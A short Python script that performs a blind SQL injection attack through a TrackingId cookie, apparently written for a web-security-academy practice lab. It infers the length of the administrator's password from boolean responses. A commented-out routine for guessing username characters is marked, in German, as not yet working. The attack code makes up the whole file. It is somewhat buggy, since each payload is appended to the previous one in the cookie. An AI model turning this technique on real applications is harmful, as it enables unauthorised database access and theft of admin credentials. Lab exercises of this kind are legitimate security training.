import string
import requests
import sys

proxies = {'http':'http://127.0.0.1:8080', 'https':'https://127.0.0.1:8080'}


def fire_payload(cookies, url):
    print(cookies)
    if "Welcome back!" in requests.get(url=url, cookies=cookies).text:
    # if "Welcome back!" in requests.get(url=url, cookies=cookies, proxies=proxies).text:
        return True


# Geht gerade nicht
# warte auf lösung für Cookie-Verdopplung
# def username(cookies, url):
#    for char in string.ascii_lowercase:
#        payload = f"' AND ( SELECT '{char}' from users LIMIT 1) = '{char}"
#        cookies['TrackingId'] = cookies['TrackingId'] + payload
#        if fire_payload(cookies, url):
#            print(f"[+] Username = {char}")
#            return True


def pw_length(url):
    s = requests.Session().get(url=url)
    cookies = s.cookies.get_dict()
    for i in range(1, 50):
        payload = f"' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>{i})='a"
        cookies['TrackingId'] = cookies['TrackingId'] + payload
        if not fire_payload(cookies, url):
            print(f"[+] Password Length = {i}")
            return True
        # cookies.clear()
        # cookies.clear_session_cookies()

if __name__ == "__main__":
    try:
        # url = sys.argv[1].strip()
        url = "https://ac471fa71eaae3b280324fd400cf001e.web-security-academy.net/"
    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url>")
        print(f"[-] Example: {sys.argv[0]} http://web-security-academy.net/")
        sys.exit(-1)

    if pw_length(url):
        print("[+] Blind Sqli Successful!")
    else:
        print("[-] Blind Sqli Failed!")
